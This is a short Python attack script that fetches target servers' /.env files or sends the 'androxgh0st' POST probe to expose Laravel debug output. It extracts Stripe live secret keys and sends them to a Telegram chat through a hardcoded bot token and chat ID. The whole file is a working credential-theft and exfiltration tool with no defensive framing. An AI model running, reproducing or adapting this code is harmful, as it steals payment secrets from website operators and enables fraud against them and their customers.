import os
import re
import sys
import urllib3
import requests

requests.packages.urllib3.disable_warnings()


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    os.mkdir('Results')
except:
    pass


def main(url):
    url = f'http://{url}'
    try:
        headers = {
            'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(url + "/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text

        a = re.findall("sk_live_[0-9a-zA-Z]{24,99}", get_source)
        if len(a) != 0:
            open('srcpd.txt', "a", encoding='utf-8').write('\n'.join(a))
            token = '5370652317:AAFY8GQEXdmGN0-DZ3N5KyBoXLdcx7HWNu4'
            response = requests.post(
                url='https://api.telegram.org/bot{0}/{1}'.format(
                    token, 'sendMessage'),
                data={
                    'chat_id': -1001882458353,
                    'text': a
                }).json()
            print(response)
        else:
            get_source = requests.post(url, data={"0x[]": "androxgh0st"}, headers=headers, timeout=8, verify=False,
                                       allow_redirects=False).text
            a = re.findall("sk_live_[0-9a-zA-Z]{24,99}", get_source)
            if len(a) != 0:
                open('srcpd.txt', "a", encoding='utf-8').write('\n'.join(a))
                token = '5370652317:AAFY8GQEXdmGN0-DZ3N5KyBoXLdcx7HWNu4'
                response = requests.post(
                    url='https://api.telegram.org/bot{0}/{1}'.format(
                        token, 'sendMessage'),
                    data={
                        'chat_id': -1001882458353,
                        'text': a
                    }).json()
                print(response)
    except:
        pass


ipx = sys.argv[1]
main(ipx)
